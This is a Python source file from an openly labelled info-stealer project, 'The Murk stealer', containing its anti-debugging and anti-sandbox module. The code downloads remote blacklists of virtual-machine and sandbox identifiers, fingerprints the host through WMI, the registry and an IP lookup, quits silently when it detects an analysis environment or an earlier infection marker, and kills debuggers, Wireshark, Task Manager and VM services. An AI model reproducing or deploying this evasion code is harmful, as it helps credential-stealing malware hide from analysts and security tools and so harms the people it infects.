#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

import os
from subprocess import check_output, PIPE
import psutil
import uuid
import wmi
import subprocess
import requests
import platform
import json


try:
    blacklisted_Bios = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_Bios.txt').text.replace('\r', '').split('\n'))
except:
    blacklisted_Bios = []
try:
    blacklisted_Manufacture = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_Manufacture.txt').text.replace('\r', '').split('\n'))
except:
    blacklisted_Manufacture = []
try:   
    blacklisted_BaseBoard = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_BaseBoard.txt').text.replace('\r', '').split('\n'))
except:
    blacklisted_BaseBoard = []
try:
    blacklisted_CPU = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_CPU.txt').text.replace('\r', '').split('\n'))
except:
    blacklisted_CPU = []
try:
    blacklisted_Drive = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_Drive.txt').text.replace('\r', '').split('\n'))
except:
    blacklisted_Drive = []
try:
    blacklisted_HW_Profile_GUID = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_HW_Profile_GUID.txt').text.replace('\r', '').split('\n'))
except:
    blacklisted_HW_Profile_GUID = []
try:
    blacklisted_Machine_GUID = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_Machine_GUID.txt').text.replace('\r', '').split('\n'))
except:
    blacklisted_Machine_GUID = []
try:
    blacklisted_Processes = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_Processes.txt').text.replace('\r', '').split('\n'))
except:
    blacklisted_Processes = []
try:
    blacklisted_GPU = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_GPU.txt').text.replace('\r', '').split('\n'))
except:
    blacklisted_GPU = []
try:
    blacklisted_HWID = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_HWID.txt').text.replace('\r', '').split('\n'))
except:
    blacklisted_HWID = []
try:
    blacklisted_ip = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_ip.txt').text.replace('\r', '').split('\n'))
except:
    blacklisted_ip = []
try:
    blacklisted_Mac_Address = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_Mac_Address.txt').text.replace('\r', '').split('\n'))
except:
    blacklisted_Mac_Address = []
try:
    blacklisted_PC_Name = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_PC_Name.txt').text.replace('\r', '').split('\n'))
except:
    blacklisted_PC_Name = []
try:
    blacklisted_Platform = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_Platform.txt').text.replace('\r', '').split('\n'))
except:
    blacklisted_Platform = []
try:
    blacklisted_Users = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_Users.txt').text.replace('\r', '').split('\n'))
except:
    blacklisted_Users = []
    
kill_Processes =["httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]


def checkHWID():
    try:
        return check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
                                        stdin=PIPE, stderr=PIPE).decode('utf-8').split('\n')[1].strip()
    except:
        return "No data"


def checkMAC():
    try:
        mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
        return ':'.join([mac[e:e + 2] for e in range(0, 12, 2)])
    except:
        return "No data"
    


def checkBIOS():
    try:
        c = wmi.WMI()
        bios = c.Win32_BIOS()[0]
        return bios.SerialNumber.strip()
    except:
        return "No data"


def checkManufacture():
    try:
        c = wmi.WMI()
        baseboard = c.Win32_BaseBoard()[0]
        return baseboard.Manufacturer.strip()
    except:
        return "No data"


def checkBASE():
    try:
        wmi_service = wmi.WMI()
        baseboards = wmi_service.Win32_BaseBoard()
        return  baseboards[0].SerialNumber
    except:
        return "No data"
    


def checkCPU():
    try:
        cpu_info = psutil.cpuinfo()
        return cpu_info[0].serial
    except:
        return "No data"



def checkDrive():
    try:
        c = wmi.WMI()
        drives = c.Win32_DiskDrive()
        return drives[0].SerialNumber.strip()
    except:
        return "No data"


def checkHW_profile():
    try:
        c = wmi.WMI()
        hw_profiles = c.Win32_SystemDriver()
        for profile in hw_profiles:
            if profile.DisplayName == 'HW Profile GUID':
                return profile.Description.strip()
        return "No data"
    except:
        return "No data"


def checkGUID():
    try:
        output = subprocess.check_output(['reg', 'query', 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography', '/v', 'MachineGuid'], stderr=subprocess.DEVNULL)
        lines = output.decode().split('\n')
        for line in lines:
            if 'MachineGuid' in line:
                _, guid = line.split()
            return guid.strip()
        return "No data"
    except:
        return "No data"



def checkGPU():
    try:
        c = wmi.WMI()
        gpu_info = []
        for gpu in c.Win32_VideoController():
            gpu_info.append((gpu.Name))
        return gpu_info
    except:
        return []




def checkIP():
    try:
        return json.loads(requests.get('https://ipinfo.io/json').text)['ip']
    except:
        return "No data"


def checkPlatform():
    try:
        return platform.system()
    except:
        return "No data"









def AntiDebug(oneStart):  

    print("ad")
    pathf = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'

    if oneStart:
        if (os.path.exists(rf'{pathf}\system\sysFiles\winDef\log20742384.txt')):# Checks if a virus has opened on this PC
            os._exit(0)
    if os.path.exists(rf'{pathf}\windll'):
        os._exit(0)

    processlist = psutil.process_iter(['name'])

    if os.getenv("USERPROFILE") in blacklisted_Users:
        os._exit(0)


    if os.getenv('COMPUTERNAME') in blacklisted_PC_Name:
        os._exit(0)


    if checkHWID() in blacklisted_HWID:
        os._exit(0)


    if checkMAC() in blacklisted_Mac_Address:
        os._exit(0)


    for exe in processlist:
        if exe.info.get('name') in blacklisted_Processes:
            os._exit(0)

    if checkBIOS() in blacklisted_Bios:
        os._exit(0)

    
    if checkManufacture() in blacklisted_Manufacture:
        os._exit(0)


    if checkBASE() in blacklisted_BaseBoard:
        os._exit(0)


    if checkCPU() in blacklisted_CPU:
        os._exit(0)


    if checkDrive() in blacklisted_Drive:
        os._exit(0)


    if checkHW_profile() in blacklisted_HW_Profile_GUID:
        os._exit(0)
 


    if checkGUID() in blacklisted_Machine_GUID:
        os._exit(0)

    gpus = checkGPU()
    for gpu in gpus:
        if gpu in blacklisted_GPU:
            os._exit(0)



    if checkIP() in blacklisted_ip:
        os._exit(0)

    if checkPlatform() in blacklisted_Platform:
        os._exit(0)
    
    for proc in processlist:
            if any(procstr in proc.name().lower() for procstr in kill_Processes):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
